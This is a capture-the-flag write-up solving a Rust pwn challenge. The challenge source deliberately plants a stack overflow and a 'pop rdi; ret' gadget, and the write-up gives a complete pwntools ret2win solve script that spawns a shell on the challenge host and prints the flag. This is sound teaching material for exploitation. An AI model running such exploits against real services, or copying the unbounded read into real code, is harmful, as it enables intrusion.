# Pwn &mdash; solution

We're given instructions to connect to a remote service, along with a
`handout.zip` containing the source code and binary of said service. Connecting
shows a short banner and a prompt:

```
$ nc 0.cloud.chals.io 31984

Welcome to my first Rust program!

Say something:
```

Typing anything just returns and the program exits. Nothing obviously
interactive, smells like a textbook
[buffer-overflow](https://en.wikipedia.org/wiki/Buffer_overflow) target.

Let's perform the usual triage on the binary:

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9831aa809f22c1b69989b62453ed30be78d2b662, with debug_info, not stripped

$ checksec chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
```

Since the stack is non-executable, we likely can't overflow with a shellcode.
There is no [stack
canary](https://ctf101.org/binary-exploitation/stack-canaries/), making our
lives easier, and no
[PIE](https://en.wikipedia.org/wiki/Position-independent_code) meaning
addresses are static within the binary.

Looks like the authors were kind enough to supply the full source code within the handout. Let's inspect `chall.rs`:

```rust
use std::os::raw::{c_char, c_int, c_void};

#[link_section = ".text.patch"]
static PATCHPOINT: [u8; 2] = [0x5F, 0xC3];

#[repr(C)]
struct FILE {
    _priv: [u8; 0],
}

extern "C" {
    fn read(fd: c_int, buf: *mut c_void, count: usize) -> isize;
    fn puts(s: *const c_char) -> c_int;
    fn system(cmd: *const c_char) -> c_int;
    fn exit(code: c_int) -> !;
    static mut stdout: *mut FILE;
    fn setbuf(stream: *mut FILE, buf: *mut c_char);
}

const WELCOME: &[u8] = b"Welcome to my first Rust program!\n\0";
const PROMPT: &[u8] = b"Say something:\n\0";
const BYE: &[u8] = b"Bye!\n\0";
const NOPE: &[u8] = b"nope\n\0";
const BINSH: &[u8] = b"/bin/sh\0";

#[no_mangle]
pub extern "C" fn win(key: u64) {
    unsafe {
        if key != 0xdeadbeefcafebabeu64 {
            puts(NOPE.as_ptr() as *const c_char);
            exit(1);
        }
        system(BINSH.as_ptr() as *const c_char);
    }
}

pub extern "C" fn vuln() {
    let mut buf = [0u8; 64];
    unsafe {
        setbuf(stdout, std::ptr::null_mut());
        puts(PROMPT.as_ptr() as *const c_char);
        read(0, buf.as_mut_ptr() as *mut c_void, 0x200);
    }
}

fn main() {
    unsafe {
        puts(WELCOME.as_ptr() as *const c_char);
    }
    vuln();
    unsafe {
        puts(BYE.as_ptr() as *const c_char);
    }
}
```

This is a weird-looking piece of Rust code, mainly because it's filled with
[unsafe](https://doc.rust-lang.org/book/ch20-01-unsafe-rust.html) blocks, which
basically switches off the standard memory-safety protections Rust is known
for.

Some key takeaways from the source:
  * `vuln()` reads `0x200` bytes into a 64-byte stack buffer, a classic stack overflow vulnerability.
  * `win(key)` expects `rdi = 0xdeadbeefcafebabe`, then calls `system("/bin/sh")`.
  * The 2-byte `.text.patch` **plants a guaranteed** `pop rdi; ret`
  [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) gadget in
  the code section.

This is a classic [ret2win ROP](https://ropemporium.com/challenge/ret2win.html).

Final exploitation plan:
  * Find the RIP offset (e.g. by playing around in GDB)
  * Locate the `pop rdi ; ret` gadget
  * Set `rdi` to `0xdeadbeefcafebabe`
  * Return into `win`
  * Grab flag

Putting it all together in a solve script:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = e = ELF('./chall', checksec=False)
context.log_level = 'info'

OFFSET = 72
KEY = 0xdeadbeefcafebabe

io = remote("0.cloud.chals.io", 31984)
io.recvuntil(b"Say something:\n")

rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
ret = rop.find_gadget(['ret']).address
win = e.symbols['win']

payload = flat(
    b'A'*OFFSET,
    ret,
    pop_rdi,
    KEY,
    win,
)

io.send(payload)
io.interactive()
```

Running it gets us the shell, and we easily grab the flag:

```
$ python3 solve.py

[+] Opening connection to 0.cloud.chals.io on port 31984: Done
[*] Loaded 87 cached gadgets for './chall'
[*] Switching to interactive mode

$ ls
chall
flag.txt
$ cat flag.txt
FortID{1_D0n'7_Th1nk_Th1s_1s_H0w_Y0u'r3_Supp0s3d_T0_Wr1t3_C0d3_1n_Ru5t}
```
